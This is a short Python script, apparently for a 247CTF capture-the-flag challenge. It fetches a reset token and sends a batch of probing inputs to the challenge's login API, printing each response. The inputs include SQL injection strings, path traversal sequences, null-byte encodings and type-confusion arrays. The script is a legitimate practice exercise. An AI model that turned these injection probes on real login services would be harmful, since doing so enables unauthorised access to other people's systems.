#!/usr/bin/env python3
import requests
import json

BASE_URL = "https://a2f2134654cc41a2.247ctf.com"

def get_token():
    resp = requests.get(f"{BASE_URL}/api/get_token", timeout=10)
    return resp.json()["message"].split("reset to ")[1].rstrip("!")

def explore_login():
    api_token = get_token()
    
    # Probar diferentes tipos de input
    tests = [
        # Normales
        {"username": "admin", "password": "0"*32, "api": api_token},
        {"username": "admin", "password": "a"*32, "api": api_token},
        
        # SQL injection
        {"username": "admin' OR '1'='1", "password": "0"*32, "api": api_token},
        {"username": "admin", "password": "' OR '1'='1", "api": api_token},
        
        # Inputs vacíos/nulos
        {"username": "admin", "api": api_token},
        {"username": "admin", "password": "", "api": api_token},
        
        # Inputs largos
        {"username": "admin", "password": "0"*100, "api": api_token},
        
        # Caracteres especiales
        {"username": "admin", "password": "../"*16, "api": api_token},
        {"username": "admin", "password": "%00"*16, "api": api_token},
        
        # Arrays/objetos (si el servidor acepta JSON)
        {"username": "admin", "password": ["0"*32], "api": api_token},
    ]
    
    for i, data in enumerate(tests):
        try:
            resp = requests.post(f"{BASE_URL}/api/login", data=data, timeout=10)
            print(f"Test {i}: {data}")
            print(f"  Status: {resp.status_code}")
            print(f"  Response: {resp.text}")
            print(f"  Headers: {dict(resp.headers)}")
            print()
        except Exception as e:
            print(f"Test {i} error: {e}\n")

explore_login()
